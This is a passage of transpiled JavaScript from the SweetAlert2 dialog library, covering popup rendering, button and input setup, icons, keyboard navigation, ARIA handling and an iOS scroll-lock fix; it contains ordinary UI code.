        var setStyle = function setStyle2(parent, selector, property, value) {
          var el = parent.querySelector(selector);
          if (el) {
            el.style.setProperty(property, value);
          }
        };
        var toggle2 = function toggle3(elem, condition) {
          var display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
          condition ? show(elem, display) : hide(elem);
        };
        var isVisible$1 = function isVisible2(elem) {
          return !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
        };
        var allButtonsAreHidden = function allButtonsAreHidden2() {
          return !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
        };
        var isScrollable = function isScrollable2(elem) {
          return !!(elem.scrollHeight > elem.clientHeight);
        };
        var hasCssAnimation = function hasCssAnimation2(elem) {
          var style = window.getComputedStyle(elem);
          var animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
          var transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
          return animDuration > 0 || transDuration > 0;
        };
        var animateTimerProgressBar = function animateTimerProgressBar2(timer) {
          var reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
          var timerProgressBar = getTimerProgressBar();
          if (!timerProgressBar) {
            return;
          }
          if (isVisible$1(timerProgressBar)) {
            if (reset) {
              timerProgressBar.style.transition = "none";
              timerProgressBar.style.width = "100%";
            }
            setTimeout(function() {
              timerProgressBar.style.transition = "width ".concat(timer / 1e3, "s linear");
              timerProgressBar.style.width = "0%";
            }, 10);
          }
        };
        var stopTimerProgressBar = function stopTimerProgressBar2() {
          var timerProgressBar = getTimerProgressBar();
          if (!timerProgressBar) {
            return;
          }
          var timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
          timerProgressBar.style.removeProperty("transition");
          timerProgressBar.style.width = "100%";
          var timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
          var timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
          timerProgressBar.style.width = "".concat(timerProgressBarPercent, "%");
        };
        var isNodeEnv = function isNodeEnv2() {
          return typeof window === "undefined" || typeof document === "undefined";
        };
        var sweetHTML = '\n <div aria-labelledby="'.concat(swalClasses.title, '" aria-describedby="').concat(swalClasses["html-container"], '" class="').concat(swalClasses.popup, '" tabindex="-1">\n   <button type="button" class="').concat(swalClasses.close, '"></button>\n   <ul class="').concat(swalClasses["progress-steps"], '"></ul>\n   <div class="').concat(swalClasses.icon, '"></div>\n   <img class="').concat(swalClasses.image, '" />\n   <h2 class="').concat(swalClasses.title, '" id="').concat(swalClasses.title, '"></h2>\n   <div class="').concat(swalClasses["html-container"], '" id="').concat(swalClasses["html-container"], '"></div>\n   <input class="').concat(swalClasses.input, '" id="').concat(swalClasses.input, '" />\n   <input type="file" class="').concat(swalClasses.file, '" />\n   <div class="').concat(swalClasses.range, '">\n     <input type="range" />\n     <output></output>\n   </div>\n   <select class="').concat(swalClasses.select, '" id="').concat(swalClasses.select, '"></select>\n   <div class="').concat(swalClasses.radio, '"></div>\n   <label class="').concat(swalClasses.checkbox, '">\n     <input type="checkbox" id="').concat(swalClasses.checkbox, '" />\n     <span class="').concat(swalClasses.label, '"></span>\n   </label>\n   <textarea class="').concat(swalClasses.textarea, '" id="').concat(swalClasses.textarea, '"></textarea>\n   <div class="').concat(swalClasses["validation-message"], '" id="').concat(swalClasses["validation-message"], '"></div>\n   <div class="').concat(swalClasses.actions, '">\n     <div class="').concat(swalClasses.loader, '"></div>\n     <button type="button" class="').concat(swalClasses.confirm, '"></button>\n     <button type="button" class="').concat(swalClasses.deny, '"></button>\n     <button type="button" class="').concat(swalClasses.cancel, '"></button>\n   </div>\n   <div class="').concat(swalClasses.footer, '"></div>\n   <div class="').concat(swalClasses["timer-progress-bar-container"], '">\n     <div class="').concat(swalClasses["timer-progress-bar"], '"></div>\n   </div>\n </div>\n').replace(/(^|\n)\s*/g, "");
        var resetOldContainer = function resetOldContainer2() {
          var oldContainer = getContainer();
          if (!oldContainer) {
            return false;
          }
          oldContainer.remove();
          removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
          return true;
        };
        var resetValidationMessage$1 = function resetValidationMessage2() {
          globalState.currentInstance.resetValidationMessage();
        };
        var addInputChangeListeners = function addInputChangeListeners2() {
          var popup = getPopup();
          var input = getDirectChildByClass(popup, swalClasses.input);
          var file = getDirectChildByClass(popup, swalClasses.file);
          var range2 = popup.querySelector(".".concat(swalClasses.range, " input"));
          var rangeOutput = popup.querySelector(".".concat(swalClasses.range, " output"));
          var select = getDirectChildByClass(popup, swalClasses.select);
          var checkbox = popup.querySelector(".".concat(swalClasses.checkbox, " input"));
          var textarea = getDirectChildByClass(popup, swalClasses.textarea);
          input.oninput = resetValidationMessage$1;
          file.onchange = resetValidationMessage$1;
          select.onchange = resetValidationMessage$1;
          checkbox.onchange = resetValidationMessage$1;
          textarea.oninput = resetValidationMessage$1;
          range2.oninput = function() {
            resetValidationMessage$1();
            rangeOutput.value = range2.value;
          };
          range2.onchange = function() {
            resetValidationMessage$1();
            rangeOutput.value = range2.value;
          };
        };
        var getTarget = function getTarget2(target) {
          return typeof target === "string" ? document.querySelector(target) : target;
        };
        var setupAccessibility = function setupAccessibility2(params) {
          var popup = getPopup();
          popup.setAttribute("role", params.toast ? "alert" : "dialog");
          popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
          if (!params.toast) {
            popup.setAttribute("aria-modal", "true");
          }
        };
        var setupRTL = function setupRTL2(targetElement) {
          if (window.getComputedStyle(targetElement).direction === "rtl") {
            addClass(getContainer(), swalClasses.rtl);
          }
        };
        var init = function init2(params) {
          var oldContainerExisted = resetOldContainer();
          if (isNodeEnv()) {
            error2("SweetAlert2 requires document to initialize");
            return;
          }
          var container = document.createElement("div");
          container.className = swalClasses.container;
          if (oldContainerExisted) {
            addClass(container, swalClasses["no-transition"]);
          }
          setInnerHtml(container, sweetHTML);
          var targetElement = getTarget(params.target);
          targetElement.appendChild(container);
          setupAccessibility(params);
          setupRTL(targetElement);
          addInputChangeListeners();
        };
        var parseHtmlToContainer = function parseHtmlToContainer2(param, target) {
          if (param instanceof HTMLElement) {
            target.appendChild(param);
          } else if (_typeof(param) === "object") {
            handleObject(param, target);
          } else if (param) {
            setInnerHtml(target, param);
          }
        };
        var handleObject = function handleObject2(param, target) {
          if (param.jquery) {
            handleJqueryElem(target, param);
          } else {
            setInnerHtml(target, param.toString());
          }
        };
        var handleJqueryElem = function handleJqueryElem2(target, elem) {
          target.textContent = "";
          if (0 in elem) {
            for (var i = 0; i in elem; i++) {
              target.appendChild(elem[i].cloneNode(true));
            }
          } else {
            target.appendChild(elem.cloneNode(true));
          }
        };
        var animationEndEvent = function() {
          if (isNodeEnv()) {
            return false;
          }
          var testEl = document.createElement("div");
          if (typeof testEl.style.webkitAnimation !== "undefined") {
            return "webkitAnimationEnd";
          }
          if (typeof testEl.style.animation !== "undefined") {
            return "animationend";
          }
          return false;
        }();
        var renderActions = function renderActions2(instance, params) {
          var actions = getActions();
          var loader = getLoader();
          if (!actions || !loader) {
            return;
          }
          if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
            hide(actions);
          } else {
            show(actions);
          }
          applyCustomClass(actions, params, "actions");
          renderButtons(actions, loader, params);
          setInnerHtml(loader, params.loaderHtml || "");
          applyCustomClass(loader, params, "loader");
        };
        function renderButtons(actions, loader, params) {
          var confirmButton = getConfirmButton();
          var denyButton = getDenyButton();
          var cancelButton = getCancelButton();
          if (!confirmButton || !denyButton || !cancelButton) {
            return;
          }
          renderButton(confirmButton, "confirm", params);
          renderButton(denyButton, "deny", params);
          renderButton(cancelButton, "cancel", params);
          handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
          if (params.reverseButtons) {
            if (params.toast) {
              actions.insertBefore(cancelButton, confirmButton);
              actions.insertBefore(denyButton, confirmButton);
            } else {
              actions.insertBefore(cancelButton, loader);
              actions.insertBefore(denyButton, loader);
              actions.insertBefore(confirmButton, loader);
            }
          }
        }
        function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
          if (!params.buttonsStyling) {
            removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
            return;
          }
          addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          if (params.confirmButtonColor) {
            confirmButton.style.backgroundColor = params.confirmButtonColor;
            addClass(confirmButton, swalClasses["default-outline"]);
          }
          if (params.denyButtonColor) {
            denyButton.style.backgroundColor = params.denyButtonColor;
            addClass(denyButton, swalClasses["default-outline"]);
          }
          if (params.cancelButtonColor) {
            cancelButton.style.backgroundColor = params.cancelButtonColor;
            addClass(cancelButton, swalClasses["default-outline"]);
          }
        }
        function renderButton(button, buttonType, params) {
          var buttonName = (
            /** @type {'Confirm' | 'Deny' | 'Cancel'} */
            capitalizeFirstLetter(buttonType)
          );
          toggle2(button, params["show".concat(buttonName, "Button")], "inline-block");
          setInnerHtml(button, params["".concat(buttonType, "ButtonText")] || "");
          button.setAttribute("aria-label", params["".concat(buttonType, "ButtonAriaLabel")] || "");
          button.className = swalClasses[buttonType];
          applyCustomClass(button, params, "".concat(buttonType, "Button"));
        }
        var renderCloseButton = function renderCloseButton2(instance, params) {
          var closeButton = getCloseButton();
          if (!closeButton) {
            return;
          }
          setInnerHtml(closeButton, params.closeButtonHtml || "");
          applyCustomClass(closeButton, params, "closeButton");
          toggle2(closeButton, params.showCloseButton);
          closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
        };
        var renderContainer = function renderContainer2(instance, params) {
          var container = getContainer();
          if (!container) {
            return;
          }
          handleBackdropParam(container, params.backdrop);
          handlePositionParam(container, params.position);
          handleGrowParam(container, params.grow);
          applyCustomClass(container, params, "container");
        };
        function handleBackdropParam(container, backdrop) {
          if (typeof backdrop === "string") {
            container.style.background = backdrop;
          } else if (!backdrop) {
            addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
          }
        }
        function handlePositionParam(container, position) {
          if (!position) {
            return;
          }
          if (position in swalClasses) {
            addClass(container, swalClasses[position]);
          } else {
            warn('The "position" parameter is not valid, defaulting to "center"');
            addClass(container, swalClasses.center);
          }
        }
        function handleGrowParam(container, grow) {
          if (!grow) {
            return;
          }
          addClass(container, swalClasses["grow-".concat(grow)]);
        }
        var privateProps = {
          innerParams: /* @__PURE__ */ new WeakMap(),
          domCache: /* @__PURE__ */ new WeakMap()
        };
        var inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
        var renderInput = function renderInput2(instance, params) {
          var popup = getPopup();
          if (!popup) {
            return;
          }
          var innerParams = privateProps.innerParams.get(instance);
          var rerender = !innerParams || params.input !== innerParams.input;
          inputClasses.forEach(function(inputClass) {
            var inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
            if (!inputContainer) {
              return;
            }
            setAttributes(inputClass, params.inputAttributes);
            inputContainer.className = swalClasses[inputClass];
            if (rerender) {
              hide(inputContainer);
            }
          });
          if (params.input) {
            if (rerender) {
              showInput(params);
            }
            setCustomClass(params);
          }
        };
        var showInput = function showInput2(params) {
          if (!params.input) {
            return;
          }
          if (!renderInputType[params.input]) {
            error2("Unexpected type of input! Expected ".concat(Object.keys(renderInputType).join(" | "), ', got "').concat(params.input, '"'));
            return;
          }
          var inputContainer = getInputContainer(params.input);
          var input = renderInputType[params.input](inputContainer, params);
          show(inputContainer);
          if (params.inputAutoFocus) {
            setTimeout(function() {
              focusInput(input);
            });
          }
        };
        var removeAttributes = function removeAttributes2(input) {
          for (var i = 0; i < input.attributes.length; i++) {
            var attrName = input.attributes[i].name;
            if (!["id", "type", "value", "style"].includes(attrName)) {
              input.removeAttribute(attrName);
            }
          }
        };
        var setAttributes = function setAttributes2(inputClass, inputAttributes) {
          var input = getInput$1(getPopup(), inputClass);
          if (!input) {
            return;
          }
          removeAttributes(input);
          for (var attr in inputAttributes) {
            input.setAttribute(attr, inputAttributes[attr]);
          }
        };
        var setCustomClass = function setCustomClass2(params) {
          var inputContainer = getInputContainer(params.input);
          if (_typeof(params.customClass) === "object") {
            addClass(inputContainer, params.customClass.input);
          }
        };
        var setInputPlaceholder = function setInputPlaceholder2(input, params) {
          if (!input.placeholder || params.inputPlaceholder) {
            input.placeholder = params.inputPlaceholder;
          }
        };
        var setInputLabel = function setInputLabel2(input, prependTo, params) {
          if (params.inputLabel) {
            var label = document.createElement("label");
            var labelClass = swalClasses["input-label"];
            label.setAttribute("for", input.id);
            label.className = labelClass;
            if (_typeof(params.customClass) === "object") {
              addClass(label, params.customClass.inputLabel);
            }
            label.innerText = params.inputLabel;
            prependTo.insertAdjacentElement("beforebegin", label);
          }
        };
        var getInputContainer = function getInputContainer2(inputType) {
          return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
        };
        var checkAndSetInputValue = function checkAndSetInputValue2(input, inputValue) {
          if (["string", "number"].includes(_typeof(inputValue))) {
            input.value = "".concat(inputValue);
          } else if (!isPromise(inputValue)) {
            warn('Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(_typeof(inputValue), '"'));
          }
        };
        var renderInputType = {};
        renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = function(input, params) {
          checkAndSetInputValue(input, params.inputValue);
          setInputLabel(input, input, params);
          setInputPlaceholder(input, params);
          input.type = params.input;
          return input;
        };
        renderInputType.file = function(input, params) {
          setInputLabel(input, input, params);
          setInputPlaceholder(input, params);
          return input;
        };
        renderInputType.range = function(range2, params) {
          var rangeInput = range2.querySelector("input");
          var rangeOutput = range2.querySelector("output");
          checkAndSetInputValue(rangeInput, params.inputValue);
          rangeInput.type = params.input;
          checkAndSetInputValue(rangeOutput, params.inputValue);
          setInputLabel(rangeInput, range2, params);
          return range2;
        };
        renderInputType.select = function(select, params) {
          select.textContent = "";
          if (params.inputPlaceholder) {
            var placeholder = document.createElement("option");
            setInnerHtml(placeholder, params.inputPlaceholder);
            placeholder.value = "";
            placeholder.disabled = true;
            placeholder.selected = true;
            select.appendChild(placeholder);
          }
          setInputLabel(select, select, params);
          return select;
        };
        renderInputType.radio = function(radio) {
          radio.textContent = "";
          return radio;
        };
        renderInputType.checkbox = function(checkboxContainer, params) {
          var checkbox = getInput$1(getPopup(), "checkbox");
          checkbox.value = "1";
          checkbox.checked = Boolean(params.inputValue);
          var label = checkboxContainer.querySelector("span");
          setInnerHtml(label, params.inputPlaceholder);
          return checkbox;
        };
        renderInputType.textarea = function(textarea, params) {
          checkAndSetInputValue(textarea, params.inputValue);
          setInputPlaceholder(textarea, params);
          setInputLabel(textarea, textarea, params);
          var getMargin = function getMargin2(el) {
            return parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
          };
          setTimeout(function() {
            if ("MutationObserver" in window) {
              var initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
              var textareaResizeHandler = function textareaResizeHandler2() {
                if (!document.body.contains(textarea)) {
                  return;
                }
                var textareaWidth = textarea.offsetWidth + getMargin(textarea);
                if (textareaWidth > initialPopupWidth) {
                  getPopup().style.width = "".concat(textareaWidth, "px");
                } else {
                  applyNumericalStyle(getPopup(), "width", params.width);
                }
              };
              new MutationObserver(textareaResizeHandler).observe(textarea, {
                attributes: true,
                attributeFilter: ["style"]
              });
            }
          });
          return textarea;
        };
        var renderContent = function renderContent2(instance, params) {
          var htmlContainer = getHtmlContainer();
          if (!htmlContainer) {
            return;
          }
          showWhenInnerHtmlPresent(htmlContainer);
          applyCustomClass(htmlContainer, params, "htmlContainer");
          if (params.html) {
            parseHtmlToContainer(params.html, htmlContainer);
            show(htmlContainer, "block");
          } else if (params.text) {
            htmlContainer.textContent = params.text;
            show(htmlContainer, "block");
          } else {
            hide(htmlContainer);
          }
          renderInput(instance, params);
        };
        var renderFooter = function renderFooter2(instance, params) {
          var footer = getFooter();
          if (!footer) {
            return;
          }
          showWhenInnerHtmlPresent(footer);
          toggle2(footer, params.footer, "block");
          if (params.footer) {
            parseHtmlToContainer(params.footer, footer);
          }
          applyCustomClass(footer, params, "footer");
        };
        var renderIcon = function renderIcon2(instance, params) {
          var innerParams = privateProps.innerParams.get(instance);
          var icon = getIcon();
          if (!icon) {
            return;
          }
          if (innerParams && params.icon === innerParams.icon) {
            setContent(icon, params);
            applyStyles(icon, params);
            return;
          }
          if (!params.icon && !params.iconHtml) {
            hide(icon);
            return;
          }
          if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
            error2('Unknown icon! Expected "success", "error", "warning", "info" or "question", got "'.concat(params.icon, '"'));
            hide(icon);
            return;
          }
          show(icon);
          setContent(icon, params);
          applyStyles(icon, params);
          addClass(icon, params.showClass && params.showClass.icon);
        };
        var applyStyles = function applyStyles2(icon, params) {
          for (var _i = 0, _Object$entries = Object.entries(iconTypes); _i < _Object$entries.length; _i++) {
            var _Object$entries$_i = _slicedToArray(_Object$entries[_i], 2), iconType = _Object$entries$_i[0], iconClassName = _Object$entries$_i[1];
            if (params.icon !== iconType) {
              removeClass(icon, iconClassName);
            }
          }
          addClass(icon, params.icon && iconTypes[params.icon]);
          setColor(icon, params);
          adjustSuccessIconBackgroundColor();
          applyCustomClass(icon, params, "icon");
        };
        var adjustSuccessIconBackgroundColor = function adjustSuccessIconBackgroundColor2() {
          var popup = getPopup();
          if (!popup) {
            return;
          }
          var popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
          var successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
          for (var i = 0; i < successIconParts.length; i++) {
            successIconParts[i].style.backgroundColor = popupBackgroundColor;
          }
        };
        var successIconHtml = '\n  <div class="swal2-success-circular-line-left"></div>\n  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n  <div class="swal2-success-circular-line-right"></div>\n';
        var errorIconHtml = '\n  <span class="swal2-x-mark">\n    <span class="swal2-x-mark-line-left"></span>\n    <span class="swal2-x-mark-line-right"></span>\n  </span>\n';
        var setContent = function setContent2(icon, params) {
          if (!params.icon && !params.iconHtml) {
            return;
          }
          var oldContent = icon.innerHTML;
          var newContent = "";
          if (params.iconHtml) {
            newContent = iconContent(params.iconHtml);
          } else if (params.icon === "success") {
            newContent = successIconHtml;
            oldContent = oldContent.replace(/ style=".*?"/g, "");
          } else if (params.icon === "error") {
            newContent = errorIconHtml;
          } else if (params.icon) {
            var defaultIconHtml = {
              question: "?",
              warning: "!",
              info: "i"
            };
            newContent = iconContent(defaultIconHtml[params.icon]);
          }
          if (oldContent.trim() !== newContent.trim()) {
            setInnerHtml(icon, newContent);
          }
        };
        var setColor = function setColor2(icon, params) {
          if (!params.iconColor) {
            return;
          }
          icon.style.color = params.iconColor;
          icon.style.borderColor = params.iconColor;
          for (var _i2 = 0, _arr = [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]; _i2 < _arr.length; _i2++) {
            var sel = _arr[_i2];
            setStyle(icon, sel, "background-color", params.iconColor);
          }
          setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
        };
        var iconContent = function iconContent2(content) {
          return '<div class="'.concat(swalClasses["icon-content"], '">').concat(content, "</div>");
        };
        var renderImage = function renderImage2(instance, params) {
          var image = getImage();
          if (!image) {
            return;
          }
          if (!params.imageUrl) {
            hide(image);
            return;
          }
          show(image, "");
          image.setAttribute("src", params.imageUrl);
          image.setAttribute("alt", params.imageAlt || "");
          applyNumericalStyle(image, "width", params.imageWidth);
          applyNumericalStyle(image, "height", params.imageHeight);
          image.className = swalClasses.image;
          applyCustomClass(image, params, "image");
        };
        var renderPopup = function renderPopup2(instance, params) {
          var container = getContainer();
          var popup = getPopup();
          if (!container || !popup) {
            return;
          }
          if (params.toast) {
            applyNumericalStyle(container, "width", params.width);
            popup.style.width = "100%";
            var loader = getLoader();
            loader && popup.insertBefore(loader, getIcon());
          } else {
            applyNumericalStyle(popup, "width", params.width);
          }
          applyNumericalStyle(popup, "padding", params.padding);
          if (params.color) {
            popup.style.color = params.color;
          }
          if (params.background) {
            popup.style.background = params.background;
          }
          hide(getValidationMessage());
          addClasses$1(popup, params);
        };
        var addClasses$1 = function addClasses3(popup, params) {
          var showClass = params.showClass || {};
          popup.className = "".concat(swalClasses.popup, " ").concat(isVisible$1(popup) ? showClass.popup : "");
          if (params.toast) {
            addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
            addClass(popup, swalClasses.toast);
          } else {
            addClass(popup, swalClasses.modal);
          }
          applyCustomClass(popup, params, "popup");
          if (typeof params.customClass === "string") {
            addClass(popup, params.customClass);
          }
          if (params.icon) {
            addClass(popup, swalClasses["icon-".concat(params.icon)]);
          }
        };
        var renderProgressSteps = function renderProgressSteps2(instance, params) {
          var progressStepsContainer = getProgressSteps();
          if (!progressStepsContainer) {
            return;
          }
          var progressSteps = params.progressSteps, currentProgressStep = params.currentProgressStep;
          if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
            hide(progressStepsContainer);
            return;
          }
          show(progressStepsContainer);
          progressStepsContainer.textContent = "";
          if (currentProgressStep >= progressSteps.length) {
            warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
          }
          progressSteps.forEach(function(step, index) {
            var stepEl = createStepElement(step);
            progressStepsContainer.appendChild(stepEl);
            if (index === currentProgressStep) {
              addClass(stepEl, swalClasses["active-progress-step"]);
            }
            if (index !== progressSteps.length - 1) {
              var lineEl = createLineElement(params);
              progressStepsContainer.appendChild(lineEl);
            }
          });
        };
        var createStepElement = function createStepElement2(step) {
          var stepEl = document.createElement("li");
          addClass(stepEl, swalClasses["progress-step"]);
          setInnerHtml(stepEl, step);
          return stepEl;
        };
        var createLineElement = function createLineElement2(params) {
          var lineEl = document.createElement("li");
          addClass(lineEl, swalClasses["progress-step-line"]);
          if (params.progressStepsDistance) {
            applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
          }
          return lineEl;
        };
        var renderTitle = function renderTitle2(instance, params) {
          var title = getTitle();
          if (!title) {
            return;
          }
          showWhenInnerHtmlPresent(title);
          toggle2(title, params.title || params.titleText, "block");
          if (params.title) {
            parseHtmlToContainer(params.title, title);
          }
          if (params.titleText) {
            title.innerText = params.titleText;
          }
          applyCustomClass(title, params, "title");
        };
        var render = function render2(instance, params) {
          renderPopup(instance, params);
          renderContainer(instance, params);
          renderProgressSteps(instance, params);
          renderIcon(instance, params);
          renderImage(instance, params);
          renderTitle(instance, params);
          renderCloseButton(instance, params);
          renderContent(instance, params);
          renderActions(instance, params);
          renderFooter(instance, params);
          var popup = getPopup();
          if (typeof params.didRender === "function" && popup) {
            params.didRender(popup);
          }
        };
        var isVisible = function isVisible2() {
          return isVisible$1(getPopup());
        };
        var clickConfirm = function clickConfirm2() {
          var _dom$getConfirmButton;
          return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
        };
        var clickDeny = function clickDeny2() {
          var _dom$getDenyButton;
          return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
        };
        var clickCancel = function clickCancel2() {
          var _dom$getCancelButton;
          return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
        };
        var DismissReason = Object.freeze({
          cancel: "cancel",
          backdrop: "backdrop",
          close: "close",
          esc: "esc",
          timer: "timer"
        });
        var removeKeydownHandler = function removeKeydownHandler2(globalState2) {
          if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
            globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
              capture: globalState2.keydownListenerCapture
            });
            globalState2.keydownHandlerAdded = false;
          }
        };
        var addKeydownHandler = function addKeydownHandler2(globalState2, innerParams, dismissWith) {
          removeKeydownHandler(globalState2);
          if (!innerParams.toast) {
            globalState2.keydownHandler = function(e) {
              return keydownHandler(innerParams, e, dismissWith);
            };
            globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
            globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
            globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
              capture: globalState2.keydownListenerCapture
            });
            globalState2.keydownHandlerAdded = true;
          }
        };
        var setFocus = function setFocus2(index, increment) {
          var _dom$getPopup;
          var focusableElements = getFocusableElements();
          if (focusableElements.length) {
            index = index + increment;
            if (index === focusableElements.length) {
              index = 0;
            } else if (index === -1) {
              index = focusableElements.length - 1;
            }
            focusableElements[index].focus();
            return;
          }
          (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
        };
        var arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
        var arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
        var keydownHandler = function keydownHandler2(innerParams, event, dismissWith) {
          if (!innerParams) {
            return;
          }
          if (event.isComposing || event.keyCode === 229) {
            return;
          }
          if (innerParams.stopKeydownPropagation) {
            event.stopPropagation();
          }
          if (event.key === "Enter") {
            handleEnter(event, innerParams);
          } else if (event.key === "Tab") {
            handleTab(event);
          } else if ([].concat(arrowKeysNextButton, arrowKeysPreviousButton).includes(event.key)) {
            handleArrows(event.key);
          } else if (event.key === "Escape") {
            handleEsc(event, innerParams, dismissWith);
          }
        };
        var handleEnter = function handleEnter2(event, innerParams) {
          if (!callIfFunction(innerParams.allowEnterKey)) {
            return;
          }
          var input = getInput$1(getPopup(), innerParams.input);
          if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
            if (["textarea", "file"].includes(innerParams.input)) {
              return;
            }
            clickConfirm();
            event.preventDefault();
          }
        };
        var handleTab = function handleTab2(event) {
          var targetElement = event.target;
          var focusableElements = getFocusableElements();
          var btnIndex = -1;
          for (var i = 0; i < focusableElements.length; i++) {
            if (targetElement === focusableElements[i]) {
              btnIndex = i;
              break;
            }
          }
          if (!event.shiftKey) {
            setFocus(btnIndex, 1);
          } else {
            setFocus(btnIndex, -1);
          }
          event.stopPropagation();
          event.preventDefault();
        };
        var handleArrows = function handleArrows2(key) {
          var actions = getActions();
          var confirmButton = getConfirmButton();
          var denyButton = getDenyButton();
          var cancelButton = getCancelButton();
          if (!actions || !confirmButton || !denyButton || !cancelButton) {
            return;
          }
          var buttons = [confirmButton, denyButton, cancelButton];
          if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
            return;
          }
          var sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
          var buttonToFocus = document.activeElement;
          if (!buttonToFocus) {
            return;
          }
          for (var i = 0; i < actions.children.length; i++) {
            buttonToFocus = buttonToFocus[sibling];
            if (!buttonToFocus) {
              return;
            }
            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
              break;
            }
          }
          if (buttonToFocus instanceof HTMLButtonElement) {
            buttonToFocus.focus();
          }
        };
        var handleEsc = function handleEsc2(event, innerParams, dismissWith) {
          if (callIfFunction(innerParams.allowEscapeKey)) {
            event.preventDefault();
            dismissWith(DismissReason.esc);
          }
        };
        var privateMethods = {
          swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
          swalPromiseReject: /* @__PURE__ */ new WeakMap()
        };
        var setAriaHidden = function setAriaHidden2() {
          var bodyChildren = Array.from(document.body.children);
          bodyChildren.forEach(function(el) {
            if (el === getContainer() || el.contains(getContainer())) {
              return;
            }
            if (el.hasAttribute("aria-hidden")) {
              el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
            }
            el.setAttribute("aria-hidden", "true");
          });
        };
        var unsetAriaHidden = function unsetAriaHidden2() {
          var bodyChildren = Array.from(document.body.children);
          bodyChildren.forEach(function(el) {
            if (el.hasAttribute("data-previous-aria-hidden")) {
              el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
              el.removeAttribute("data-previous-aria-hidden");
            } else {
              el.removeAttribute("aria-hidden");
            }
          });
        };
        var isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
        var iOSfix = function iOSfix2() {
          if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
            var offset = document.body.scrollTop;
            document.body.style.top = "".concat(offset * -1, "px");
            addClass(document.body, swalClasses.iosfix);
            lockBodyScroll();
          }
        };
        var lockBodyScroll = function lockBodyScroll2() {
          var container = getContainer();
          if (!container) {
            return;
          }
          var preventTouchMove;
          container.ontouchstart = function(event) {
            preventTouchMove = shouldPreventTouchMove(event);
          };
          container.ontouchmove = function(event) {
            if (preventTouchMove) {
              event.preventDefault();
              event.stopPropagation();
            }
          };
        };
        var shouldPreventTouchMove = function shouldPreventTouchMove2(event) {
          var target = event.target;
          var container = getContainer();
          var htmlContainer = getHtmlContainer();
          if (!container || !htmlContainer) {
            return false;
          }
          if (isStylus(event) || isZoom(event)) {
            return false;
          }
          if (target === container) {
            return true;
          }
          if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
          target.tagName !== "TEXTAREA" && // #2266
          !(isScrollable(htmlContainer) && // #1944
          htmlContainer.contains(target))) {
            return true;
          }
          return false;
        };
        var isStylus = function isStylus2(event) {
          return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
        };
        var isZoom = function isZoom2(event) {
          return event.touches && event.touches.length > 1;
        };
        var undoIOSfix = function undoIOSfix2() {
          if (hasClass(document.body, swalClasses.iosfix)) {
